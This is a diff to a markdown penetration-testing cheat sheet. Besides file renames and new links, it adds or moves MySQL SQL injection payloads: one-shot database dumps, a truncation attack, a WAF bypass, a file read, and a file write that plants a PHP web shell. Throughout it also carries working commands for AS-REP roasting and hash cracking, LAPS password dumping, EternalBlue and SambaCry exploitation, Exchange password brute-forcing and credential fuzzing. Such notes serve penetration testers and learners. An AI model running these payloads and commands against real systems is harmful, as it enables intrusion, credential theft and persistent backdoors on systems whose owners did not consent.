@@ -469,11 +469,11 @@ $ sudo nmap -n -Pn -sV --script 'smb-vuln*' 10.10.13.37 -p445
 
 * [https://book.hacktricks.xyz/pentesting/pentesting-smb#smb-server-version](https://book.hacktricks.xyz/pentesting/pentesting-smb#smb-server-version)
 
-Get SMB version for ancient versions of Samba:
+Get SMB version for ancient versions of Samba (for security reasons modern clients will not initiate connection with old protocols in use):
 
 ```
 $ sudo ngrep -i -d eth0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
-$ echo exit | smbclient -L 10.10.13.37 --option='client min protocol=LANMAN1'
+$ echo exit | smbclient -N -L 10.10.13.37 --option='client min protocol=LANMAN1'
 ```
 
 
@@ -708,8 +708,8 @@ $ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
 Extract data for the whole domain catalog and then grep your way through:
 
 ```
-$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out
-$ cat ldap.out |grep -i memberof
+$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=megacorp,DC=local" | tee ldapsearch.out
+$ cat ldapsearch.out | grep -i memberof
 ```
 
 Or filter out only what you need:
@@ -721,7 +721,7 @@ $ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(objectClass=User)' sAMA
 Get `Remote Management Users` group:
 
 ```
-$ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=megacorp,DC=local)' |grep -i memberof
+$ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=megacorp,DC=local)' | grep -i memberof
 ```
 
 Dump LAPS passwords:
@@ -733,13 +733,13 @@ $ ldapsearch -h 127.0.0.1 -x -b "dc=megacorp,dc=local" '(ms-MCS-AdmPwd=*)' ms-MC
 Simple authentication with ldapsearch:
 
 ```
-$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' |tee ldapsearch.log
+$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' | tee ldapsearch.out
 ```
 
 Analyze large output for anomalies by searching for unique strings:
 
 ```
-$ cat ldapsearch.log | awk '{print $1}' | sort | uniq -c | sort -nr
+$ cat ldapsearch.out | awk '{print $1}' | sort | uniq -c | sort -nr
 ```
 
 
@@ -821,8 +821,8 @@ PowerView3 > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 * [https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/](https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/)
 
 ```
-$ GetNPUsers.py megacorp.local/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.log
-$ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
+$ GetNPUsers.py megacorp.local/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.out
+$ cat GetNPUsers.out | grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
@@ -2041,6 +2041,7 @@ $ evil-winrm -u snovvcrash -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s
 ## SMB (PsExec)
 
 * [https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
+* [https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm](https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm)
 
 
 
@@ -2509,6 +2510,8 @@ PS > Bypass-UAC
 # AppLocker Bypass
 
 * [https://github.com/api0cradle/UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
+* [https://www.hackplayers.com/2018/12/english-cor-profilers-bypassing-windows.html](https://www.hackplayers.com/2018/12/english-cor-profilers-bypassing-windows.html)
+* [https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html](https://0xdf.gitlab.io/2019/03/15/htb-ethereal-cor.html)
 
 
 
@@ -3233,6 +3236,7 @@ find / -type f -perm /6000 -ls 2>/dev/null
 * [https://dirtycow.ninja/](https://dirtycow.ninja/)
 * [https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
 * [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+* [https://github.com/exrienz/DirtyCow](https://github.com/exrienz/DirtyCow)
 
 
 
@@ -3782,7 +3786,72 @@ $ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//
 
 ## SQLi
 
+
+
+### MySQL
+
+
+#### DIOS
+
+* [https://defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
+* [http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
+* [https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
+* [https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
+
+```
+id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
+
+SELECT (@a) FROM (
+	SELECT(@a:=0x00), (
+		SELECT (@a) FROM (information_schema.schemata)
+		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
+	)
+) foo
+```
+
+```
+id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
+```
+
+
+#### Truncation Attack
+
+* [https://www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
+
+```
+POST /index.php HTTP/1.1
+Host: 127.0.0.1
+
+name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
+```
+
+
+#### Commas blocked by WAF
+
+```
+id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
+```
+
+
+#### Write File
+
+```
+id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
+```
+
+
+#### Read File
+
+```
+id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
+```
+
+
+
+### MSSQL
+
 * [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
+* [https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
 
 
 
@@ -3803,69 +3872,6 @@ Test WAF:
 
 ```
 $ sqlmap.py -u 'https://127.0.0.1/index.php' --data='{"id":"*"}' -p id --identify-waf --tamper='between,randomcase,space2comment' --random-agent --tor --check-tor --thread=1 -b --batch -v6
-```
-
-
-
-### DIOS
-
-* [https://defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
-* [http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html)
-* [https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server](https://dba.stackexchange.com/questions/4169/how-to-use-variables-inside-a-select-sql-server)
-* [https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/](https://www.mssqltips.com/sqlservertip/6038/sql-server-derived-table-example/)
-
-MySQL:
-
-```
-id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
-
-SELECT (@a) FROM (
-	SELECT(@a:=0x00), (
-		SELECT (@a) FROM (information_schema.schemata)
-		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
-	)
-) foo
-```
-
-```
-id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
-```
-
-
-
-### Truncation Attack
-
-* [https://www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
-
-```
-POST /index.php HTTP/1.1
-Host: 127.0.0.1
-
-name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
-```
-
-
-
-### Commas blocked by WAF
-
-```
-id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b ON 1=1#
-```
-
-
-
-### Write File
-
-```
-id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
-```
-
-
-
-### Read File
-
-```
-id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
 ```
 
 
@@ -4041,6 +4047,19 @@ GitHub:
 
 ```
 $ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+```
+
+
+
+### wfuzz
+
+* [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)
+* [https://wfuzz.readthedocs.io/en/latest/](https://wfuzz.readthedocs.io/en/latest/)
+
+```
+$ wfuzz -e encoders
+$ wfuzz -c -u 'http://10.10.13.37/index.php?id=FUZZ' -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -f wfuzz.out --hh 1337
+$ wfuzz -c -u 'http://10.10.13.37' --basic 'FUZZ:FUZ2Z' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --hc 1337
 ```
 
 
@@ -4534,7 +4553,7 @@ $ cat nmap/initial.nmap | egrep -o '^[0-9]{1,5}' | awk -F/ '{ print $1 }' ORS=',
 Fast port discovery with Masscan + versions and scripts with Nmap:
 
 ```
-$ sudo masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > masscan/ports
+$ sudo masscan --rate 1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > masscan/ports
 $ ports=`cat masscan/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 ```
@@ -4542,11 +4561,11 @@ $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):
 
 ```
-$ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp
+$ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp.txt
 $ ports_tcp=`cat nmap/ports_tcp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp
 
-$ sudo nmap -n -Pn -sU [--max-retries 1] 127.0.0.1 -v --open | tee nmap/ports_udp
+$ sudo nmap -n -Pn -sU [--max-retries 1] 127.0.0.1 -v --open | tee nmap/ports_udp.txt
 $ ports_udp=`cat nmap/ports_udp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVCU [--reason] -oA nmap/udp 127.0.0.1 -p$ports_udp
 ```
@@ -4562,8 +4581,8 @@ $ cat /usr/share/nmap/scripts/scripts.db | grep smb
 
 Top TCP ports:
 
-|                     Port                     |              Service             |
-|:--------------------------------------------:|:--------------------------------:|
+| Port                                         | Service                          |
+|----------------------------------------------|----------------------------------|
 | 21                                           | FTP                              |
 | 22,2222                                      | SSH                              |
 | 23                                           | Telnet                           |
@@ -4627,7 +4646,7 @@ Top UDP ports:
 ```
 $ ports=21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500
 
-$ sudo masscan [-e eth0] --rate=500 --open -p$ports -iL hosts.txt --resume paused.conf >> masscan.out
+$ sudo masscan [-e eth0] --rate 500 --open -p$ports -iL hosts.txt --resume paused.conf >> masscan.out
 $ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
 ```
 
@@ -4765,7 +4784,9 @@ msf > exploit
 **CVE-2017-0144, MS17-010**
 
 
-#### Check
+#### MSF
+
+##### Check
 
 ```
 $ sudo nmap -n -Pn -sV --script smb-vuln-ms17-010 10.10.13.37 -p139,445
@@ -4773,14 +4794,14 @@ Or
 msf > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-
-#### Exploit
+##### Exploit
 
 ```
 msf > exploit/windows/smb/ms17_010_eternalblue
 ```
 
-##### Manually
+
+#### Manually
 
 * [https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)
 * [https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010)
@@ -4806,7 +4827,19 @@ def smb_pwn(conn, arch):
 
 ### SambaCry
 
-**CVE-2017-7494**
+**CVE-2017-7494** (Samba 3.5.0 < 4.4.14/4.5.10/4.6.4)
+
+
+#### MSF
+
+```
+msf > use exploit/linux/samba/is_known_pipename
+msf > set SMB::AlwaysEncrypt false
+msf > set SMB::ProtocolVersion 1
+```
+
+
+#### Manually
 
 * [https://github.com/joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
 
@@ -4979,7 +5012,7 @@ rpcclient $> enumdomgroups
 ### enum4linux
 
 ```
-$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
+$ enum4linux -v -a 127.0.0.1 | tee enum4linux.out
 ```
 
 
@@ -5258,7 +5291,7 @@ PS > Invoke-SQLAudit -Instance WEB01 -UserName sa -Password 'Passw0rd!' -Verbose
 * [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
 ```
-$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
+$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.out
 ```
 
 
@@ -5607,13 +5640,13 @@ PS > Invoke-UsernameHarvestOWA -ExchHostname mx.megacorp.com -Domain MEGACORP -U
 Autodiscover URL implicit:
 
 ```
-$ ./ruler -k -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-results-blood.txt
+$ ./ruler -k -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-blood.out
 ```
 
 Autodiscover URL explicit:
 
 ```
-$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-results-all.txt
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-all.out
 ```
 
 Notes:
